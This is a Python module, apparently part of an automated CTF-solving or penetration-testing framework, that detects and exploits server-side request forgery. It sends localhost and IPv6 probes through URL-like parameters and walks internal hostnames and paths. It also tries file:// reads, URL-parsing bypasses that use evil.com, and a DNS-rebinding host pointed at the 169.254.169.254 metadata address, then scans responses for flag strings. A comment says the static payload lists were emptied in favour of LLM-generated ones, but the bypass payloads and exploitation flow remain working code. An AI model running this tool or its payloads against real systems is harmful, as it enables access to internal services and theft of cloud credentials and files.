"""
SSRF (Server-Side Request Forgery) Detection and Exploitation

Based on PayloadsAllTheThings SSRF techniques:
- Localhost bypass (IPv6, encoding, domains)
- Internal service discovery
- URL scheme exploitation (file://, gopher://, dict://)
"""

import re
import asyncio
import aiohttp
from typing import List, Dict, Optional, Set, Tuple
from dataclasses import dataclass
from urllib.parse import quote, urlparse


@dataclass
class SSRFResult:
    """Result of SSRF test"""
    vulnerable: bool
    parameter: str
    payload: str
    technique: str
    response_excerpt: str
    flag: Optional[str] = None


class SSRFDetector:
    """Detects and exploits SSRF vulnerabilities"""

    # Parameter names that commonly accept URLs
    URL_PARAM_NAMES = [
        'url', 'uri', 'link', 'src', 'href', 'path', 'redirect',
        'callback', 'return', 'next', 'target', 'dest', 'destination',
        'rurl', 'return_url', 'redirect_url', 'redirect_uri',
        'image', 'image_url', 'img', 'img_url', 'picture', 'pic',
        'profile_picture', 'profile_picture_url', 'avatar', 'avatar_url',
        'file', 'file_url', 'document', 'doc', 'load', 'fetch',
        'page', 'site', 'website', 'feed', 'rss', 'xml',
        'proxy', 'forward', 'go', 'view', 'show', 'display',
        'api', 'endpoint', 'service', 'host', 'server',
    ]

    # NOTE: Static payloads removed for security purposes.
    # The framework uses LLM-driven payload generation instead.
    LOCALHOST_PAYLOADS = []
    INTERNAL_HOSTNAMES = []

    INTERNAL_PATHS = []
    URL_SCHEMES = {'file': [], 'gopher': [], 'dict': []}

    def __init__(self):
        self.flag_patterns = [
            r'XBEN\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'CTF\{[^}]+\}',
        ]

    def is_url_parameter(self, param_name: str) -> bool:
        """Check if parameter name suggests it accepts URLs"""
        param_lower = param_name.lower()
        return any(url_param in param_lower for url_param in self.URL_PARAM_NAMES)

    def check_flag(self, response_text: str) -> Optional[str]:
        """Check if response contains a flag"""
        for pattern in self.flag_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)
        return None

    def scrape_internal_hints(self, html: str) -> Set[str]:
        """
        Scrape page HTML for hints about internal services.
        Look for URLs, hostnames, comments mentioning internal services.
        """
        hints = set()

        # Find URLs in page content
        url_pattern = r'https?://([a-zA-Z0-9.-]+)(?::\d+)?'
        for match in re.finditer(url_pattern, html):
            hostname = match.group(1)
            # Skip external domains
            if not any(ext in hostname for ext in ['.com', '.org', '.net', '.io', '.co']):
                hints.add(hostname)

        # Find internal hostnames mentioned in text
        for hostname in self.INTERNAL_HOSTNAMES:
            if hostname in html.lower():
                hints.add(hostname)

        # Look for IP addresses
        ip_pattern = r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b'
        for match in re.finditer(ip_pattern, html):
            ip = match.group(1)
            if ip.startswith(('10.', '172.', '192.168.', '127.')):
                hints.add(ip)

        return hints

    def generate_localhost_payloads(self, path: str = "/", port: int = 80) -> List[str]:
        """Generate various localhost bypass payloads"""
        payloads = []

        for localhost in self.LOCALHOST_PAYLOADS:
            if port == 80:
                payloads.append(f"http://{localhost}{path}")
            else:
                payloads.append(f"http://{localhost}:{port}{path}")

        return payloads

    def generate_internal_payloads(self, hostnames: Set[str], paths: List[str] = None) -> List[str]:
        """Generate payloads for internal service access"""
        payloads = []
        paths = paths or self.INTERNAL_PATHS

        for hostname in hostnames:
            for path in paths:
                payloads.append(f"http://{hostname}{path}")
                payloads.append(f"http://{hostname}:80{path}")
                payloads.append(f"http://{hostname}:8080{path}")

        return payloads

    def generate_bypass_payloads(self, target_ip: str = "127.0.0.1", path: str = "/") -> List[str]:
        """Generate filter bypass payloads"""
        payloads = []

        # URL encoding
        encoded_path = quote(path)
        payloads.append(f"http://{target_ip}/{encoded_path}")

        # Double encoding
        double_encoded = quote(quote(path))
        payloads.append(f"http://{target_ip}/{double_encoded}")

        # URL parsing tricks
        payloads.extend([
            f"http://127.1.1.1:80\\@127.0.0.1:80{path}",
            f"http://127.1.1.1:80\\@@127.0.0.1:80{path}",
            f"http://evil.com@127.0.0.1{path}",
            f"http://127.0.0.1#@evil.com{path}",
        ])

        # DNS rebinding service
        payloads.append(f"http://make-127.0.0.1-rebind-169.254-169.254-rr.1u.ms{path}")

        return payloads


class SSRFTester:
    """Tests for SSRF vulnerabilities"""

    def __init__(self):
        self.detector = SSRFDetector()
        self.timeout = aiohttp.ClientTimeout(total=10)

    async def test_ssrf_parameter(
        self,
        base_url: str,
        parameter: str,
        method: str = "GET",
        additional_params: Dict = None
    ) -> Optional[SSRFResult]:
        """
        Test a single parameter for SSRF vulnerability.

        Args:
            base_url: The endpoint URL
            parameter: Parameter name to test
            method: HTTP method (GET or POST)
            additional_params: Other parameters to include

        Returns:
            SSRFResult if vulnerable, None otherwise
        """
        print(f"\n  Testing parameter: {parameter}")

        # Phase 1: Quick SSRF detection with localhost
        print(f"    [1] Quick SSRF detection...")

        quick_payloads = [
            ("http://127.0.0.1/", "localhost"),
            ("http://localhost/", "localhost"),
            ("http://[::1]/", "ipv6"),
        ]

        for payload, technique in quick_payloads:
            response = await self._make_request(base_url, parameter, payload, method, additional_params)
            if response and self._indicates_ssrf(response, payload):
                print(f"      ✓ SSRF confirmed with {technique}")

                # Check for flag in initial response
                flag = self.detector.check_flag(response)
                if flag:
                    return SSRFResult(
                        vulnerable=True,
                        parameter=parameter,
                        payload=payload,
                        technique=technique,
                        response_excerpt=response[:500],
                        flag=flag
                    )

                # Proceed to exploitation
                return await self._exploit_ssrf(base_url, parameter, method, additional_params, response)

        print(f"      ✗ No SSRF detected")
        return None

    async def _make_request(
        self,
        base_url: str,
        parameter: str,
        payload: str,
        method: str = "GET",
        additional_params: Dict = None
    ) -> Optional[str]:
        """Make HTTP request with SSRF payload"""
        try:
            params = additional_params.copy() if additional_params else {}
            params[parameter] = payload

            async with aiohttp.ClientSession(timeout=self.timeout) as session:
                if method.upper() == "GET":
                    async with session.get(base_url, params=params) as resp:
                        return await resp.text()
                else:
                    async with session.post(base_url, data=params) as resp:
                        return await resp.text()
        except Exception as e:
            return None

    def _indicates_ssrf(self, response: str, payload: str) -> bool:
        """Check if response indicates successful SSRF"""
        indicators = [
            # Localhost content indicators
            "root:", "daemon:", "/bin/bash",  # /etc/passwd
            "127.0.0.1", "localhost",  # /etc/hosts
            "internal", "restricted", "admin",
            "flag", "FLAG", "secret",
            # Error messages that indicate URL was fetched
            "connection refused", "could not connect",
            "failed to open stream", "getaddrinfo failed",
            # Success indicators
            "200 OK", "HTTP/1",
        ]

        response_lower = response.lower()

        # Check for indicators
        for indicator in indicators:
            if indicator.lower() in response_lower:
                return True

        # Check if response is different from normal (not just reflected payload)
        if payload not in response and len(response) > 100:
            return True

        return False

    async def _exploit_ssrf(
        self,
        base_url: str,
        parameter: str,
        method: str,
        additional_params: Dict,
        initial_response: str
    ) -> SSRFResult:
        """Attempt to exploit confirmed SSRF to get flag"""
        print(f"    [2] Exploiting SSRF...")

        # Scrape hints from initial response
        hints = self.detector.scrape_internal_hints(initial_response)
        if hints:
            print(f"      Found internal hints: {hints}")

        # Add common internal hostnames
        all_targets = hints.union(set(self.detector.INTERNAL_HOSTNAMES))

        # Phase 2a: Try localhost paths
        print(f"    [3] Testing localhost paths...")
        for path in self.detector.INTERNAL_PATHS:
            for localhost_payload in self.detector.generate_localhost_payloads(path):
                response = await self._make_request(base_url, parameter, localhost_payload, method, additional_params)
                if response:
                    flag = self.detector.check_flag(response)
                    if flag:
                        print(f"      🎉 FLAG FOUND!")
                        return SSRFResult(
                            vulnerable=True,
                            parameter=parameter,
                            payload=localhost_payload,
                            technique="localhost_path",
                            response_excerpt=response[:500],
                            flag=flag
                        )

        # Phase 2b: Try internal hostnames
        print(f"    [4] Testing internal services...")
        internal_payloads = self.detector.generate_internal_payloads(all_targets)

        for payload in internal_payloads[:50]:  # Limit to avoid too many requests
            response = await self._make_request(base_url, parameter, payload, method, additional_params)
            if response:
                flag = self.detector.check_flag(response)
                if flag:
                    print(f"      🎉 FLAG FOUND via {payload}!")
                    return SSRFResult(
                        vulnerable=True,
                        parameter=parameter,
                        payload=payload,
                        technique="internal_service",
                        response_excerpt=response[:500],
                        flag=flag
                    )

        # Phase 2c: Try file:// scheme
        print(f"    [5] Testing file:// scheme...")
        for file_payload in self.detector.URL_SCHEMES['file']:
            response = await self._make_request(base_url, parameter, file_payload, method, additional_params)
            if response:
                flag = self.detector.check_flag(response)
                if flag:
                    print(f"      🎉 FLAG FOUND via file://!")
                    return SSRFResult(
                        vulnerable=True,
                        parameter=parameter,
                        payload=file_payload,
                        technique="file_scheme",
                        response_excerpt=response[:500],
                        flag=flag
                    )
                # Check for /etc/passwd content (indicates file read works)
                if "root:" in response:
                    print(f"      ✓ File read confirmed with {file_payload}")

        # Phase 2d: Try bypass techniques if needed
        print(f"    [6] Testing bypass techniques...")
        bypass_payloads = self.detector.generate_bypass_payloads()

        for payload in bypass_payloads:
            response = await self._make_request(base_url, parameter, payload, method, additional_params)
            if response:
                flag = self.detector.check_flag(response)
                if flag:
                    print(f"      🎉 FLAG FOUND via bypass!")
                    return SSRFResult(
                        vulnerable=True,
                        parameter=parameter,
                        payload=payload,
                        technique="bypass",
                        response_excerpt=response[:500],
                        flag=flag
                    )

        # SSRF confirmed but no flag found
        return SSRFResult(
            vulnerable=True,
            parameter=parameter,
            payload="http://127.0.0.1/",
            technique="basic",
            response_excerpt=initial_response[:500],
            flag=None
        )
